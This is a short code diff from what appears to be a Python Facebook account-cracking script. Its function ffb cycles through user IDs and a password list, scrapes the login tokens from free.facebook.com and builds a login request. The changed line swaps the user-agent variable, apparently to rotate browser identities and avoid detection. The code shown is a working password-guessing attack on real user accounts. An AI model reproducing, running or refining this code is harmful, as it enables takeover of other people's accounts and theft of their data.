@@ -649,7 +649,7 @@ def ffb(ids,names,passlist):
                             'sec-fetch-site': 'same-origin',
                             'sec-fetch-user': '?1',
                             'upgrade-insecure-requests': '1',
-                            'user-agent': pro,
+                            'user-agent': ua,
 }
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
